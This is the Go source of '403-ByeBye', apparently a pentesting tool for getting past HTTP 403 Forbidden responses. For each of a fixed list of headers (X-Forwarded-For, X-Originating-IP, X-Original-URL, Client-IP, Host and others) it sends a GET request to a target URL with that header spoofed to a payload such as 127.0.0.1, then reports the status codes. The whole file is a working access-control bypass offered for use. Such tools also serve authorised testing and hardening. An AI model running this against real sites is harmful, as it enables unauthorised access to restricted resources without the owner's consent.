package main

/*
403-ByeBye Version: beta
Bypass 403 Forbidden Error
https://github.com/nxenon/403-bb
  _  _    ___ ____    ____             ____
 | || |  / _ \___ \  |  _ \           |  _ \
 | || |_| | | |__) | | |_) |_   _  ___| |_) |_   _  ___
 |__   _| | | |__ <  |  _ <| | | |/ _ \  _ <| | | |/ _ \
    | | | |_| |__) | | |_) | |_| |  __/ |_) | |_| |  __/
    |_|  \___/____/  |____/ \__, |\___|____/ \__, |\___|
                             __/ |            __/ |
                            |___/            |___/
*/

import (
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

var Version string = "beta"

type BypasserConfig struct {
	TargetURL string
	ProxyURL  string
	Timeout   float64
	Payload   string
	Headers   []string
}

var globalConfig BypasserConfig
var payloadHeaders []string

func main() {
	printBanner()
	parseArgs()
}

func printBanner() {
	var bannerText string
	bannerText = `
_  _    ___ ____    ____  ____  
| || |  / _ \___ \  |  _ \|  _ \  Version: %s
| || |_| | | |__) | | |_) | |_) |
|__   _| | | |__ <  |  _ <|  _ < 
   | | | |_| |__) | | |_) | |_) |
   |_|  \___/____/  |____/|____/ 
    `

	fmt.Printf(strings.TrimSpace(bannerText), Version)
	fmt.Println()
	fmt.Println()
}

func parseArgs() {

	flag.Usage = func() {

		fmt.Fprintf(os.Stderr, "Usage of %s:\n", os.Args[0])
		fmt.Printf("%s -url TARGET\n", os.Args[0])
		flag.PrintDefaults()
	}

	targetURL := flag.String("url", "", "Target URL")
	payload := flag.String("payload", "127.0.0.1", "Bypass-Value(payload) for Replacing in Headers")
	timeout := flag.Float64("timeout", 3.0, "Timeout for Requests")
	proxyURL := flag.String("proxy", "", "Send Request to Proxy [When Using Proxy set Timeout to 0 with -timeout] (Example: -proxy http://127.0.0.1:8080)")
	flag.Parse()

	globalConfig.TargetURL = *targetURL
	globalConfig.ProxyURL = *proxyURL
	globalConfig.Timeout = *timeout
	globalConfig.Payload = *payload

	if *targetURL == "" {
		fmt.Println("You have to set Target --> -url")
		os.Exit(1)
	}

	runBypasser()

}

func runBypasser() {
	printConfig()
	setHeaders()
	// Send Get Requests
	sendGetRequests()
}

func setHeaders() {
	headerList := []string{
		"X-Originating-IP",
		"X-Forwarded-For",
		"X-Forwarded",
		"Forwarded-For",
		"X-Remote-IP",
		"X-Remote-Addr",
		"X-ProxyUser-Ip",
		"X-Original-URL",
		"Client-IP",
		"True-Client-IP",
		"Cluster-Client-IP",
		"X-ProxyUser-Ip",
		"Host",
	}

	for _, header := range headerList {
		globalConfig.Headers = append(globalConfig.Headers, header)
	}

}

func printConfig() {
	var configText string
	configText = `
+--########################################################--+
	URL:         %s
	Timeout:     %v
	Payload:     %s
	Proxy:       %s
+--########################################################--+

`

	fmt.Printf(configText, globalConfig.TargetURL, globalConfig.Timeout, globalConfig.Payload, globalConfig.ProxyURL)

}

func sendGetRequests() {
	/*
		Send GET Requests for Bypassing
	*/

	TargetURL := globalConfig.TargetURL
	timeout := globalConfig.Timeout
	payload := globalConfig.Payload
	headers := globalConfig.Headers

	var transportConfig http.RoundTripper

	if globalConfig.ProxyURL == "" {
		transportConfig = &http.Transport{Proxy: nil}
	} else {
		proxyUrl, _ := url.Parse(globalConfig.ProxyURL)
		transportConfig = &http.Transport{Proxy: http.ProxyURL(proxyUrl)}
	}

	for _, headerName := range headers {

		client := http.Client{
			Timeout:   time.Duration(timeout) * time.Second,
			Transport: transportConfig,
		}

		req, err := http.NewRequest("GET", TargetURL, nil)
		if err != nil {
			errorText := `
[--BEGIN--]
Error in GET Request
Error: %v
[---End---]
`
			fmt.Printf(errorText, err)
		}

		req.Header.Set(headerName, payload)

		resp, err := client.Do(req)
		if err != nil {
			errorText := `
[--BEGIN--]
Error in GET Request
Error: %v
[---End---]
`
			fmt.Printf(errorText, err)

		} else {
			// f'[GET]     Response Length: [{str(len(req.content))}] Status Code: [{text}]')

			fmt.Printf("[GET]  Response Length:  %v  Status Code:  %v  Payload: \"%v: %v\"\n", resp.ContentLength, resp.StatusCode, headerName, payload)
		}
	}

}
